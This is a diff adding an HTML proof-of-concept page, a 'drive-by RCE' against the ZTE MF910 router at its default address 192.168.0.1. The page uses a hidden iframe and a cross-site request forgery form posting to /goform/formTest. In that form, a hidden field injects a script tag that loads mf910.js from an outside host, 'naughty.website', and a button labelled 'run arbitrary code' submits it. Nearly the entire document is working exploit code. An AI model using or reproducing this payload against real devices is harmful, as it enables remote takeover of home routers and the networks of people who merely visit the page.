@@ -1,0 +1,23 @@
+<html>
+<head>
+</head>
+<body>
+
+	<h1>Welcome to the MF910 drive-by RCE!</h1>
+	<h2>Have a wonderful day!!</h2>
+	<iframe style="display:none" name="csrf-frame"></iframe>
+	<!-- Assumes the MF910 is at default 192.168.0.1. Use WebRTC & do a sweep loop if you want instead -->
+	<form method='POST' action='http://192.168.0.1/goform/formTest' target="csrf-frame" id="csrf-form">
+	  <input type='hidden' name='name' value='0'>
+	  <input type='hidden' name='address' value='<script src="http://naughty.website/mf910.js"></script>'>
+
+	  <input type='submit' value='submit' style='visibility: hidden;'>
+	</form>
+
+	<button onclick='document.getElementById("csrf-form").submit()'>run arbitrary code</button>
+
+	<div id="output"></div>
+
+</body>
+</html>
+
